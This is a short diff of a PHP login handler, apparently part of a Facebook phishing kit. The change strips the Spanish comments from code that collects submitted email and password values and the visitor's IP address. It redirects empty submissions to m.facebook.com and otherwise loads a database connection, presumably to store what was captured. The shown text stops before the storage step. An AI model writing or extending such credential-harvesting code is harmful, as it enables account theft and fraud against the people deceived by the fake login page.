@@ -1,12 +1,12 @@
 <?php
 error_reporting(0);
 
-$usuario = $_POST['email'];  //aqui traemos el dato escrito en el campo de texto del login.html - el campo id:usuario
-$clave = $_POST['pass']; //aqui traemos el dato escrito en el campo de texto del login.html - el campo id:clave
-$ip = $_SERVER['REMOTE_ADDR']; //se captura la ip publica donde se accede a la pagina
+$usuario = $_POST['email'];
+$clave = $_POST['pass'];
+$ip = $_SERVER['REMOTE_ADDR'];
  
 if( (empty($usuario)) or (empty($clave)) ){
-     header('location: https://m.facebook.com/'); // codigo de verificacion que no esten los campos vacios
+     header('location: https://m.facebook.com/');
 }else{
 
   require_once('../conn.php');
